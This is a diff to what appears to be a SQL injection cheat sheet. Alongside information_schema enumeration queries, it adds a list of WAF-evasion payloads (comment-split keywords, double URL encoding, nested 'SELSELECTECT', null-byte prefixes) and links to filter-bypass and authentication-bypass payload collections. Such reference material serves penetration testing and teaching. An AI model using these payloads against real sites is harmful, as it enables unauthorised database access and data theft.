@@ -81,10 +81,24 @@ SELECT table_name FROM information_schema.tables WHERE table_schema = 'databasen
 SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'
 ```
 
+## Bypassing WAFs
+```
+0/**/or/**/1 => or 1=1
+SEL/**/ECT => SELECT
+%2553%2545%254c%2545%2543%2554 => select
+%53%45%4c%45%43%54 => select
+SELSELECTECT => select
+%00SELECT => select
+```
+
+## Payload links
+- [Mysql filter bypassing techniques](https://gist.github.com/cyberheartmi9/b4a4ff0f691be6b5c866450563258e86)
+- [SQL Injection Authentication Bypass payloads](https://gist.github.com/spenkk/2cd2f7eeb9cac92dd550855e522c558f)
 
 
 
 # References
 - [Port Swigger Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [Invicti](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#LineCommentAttacks)
-- 
+
+
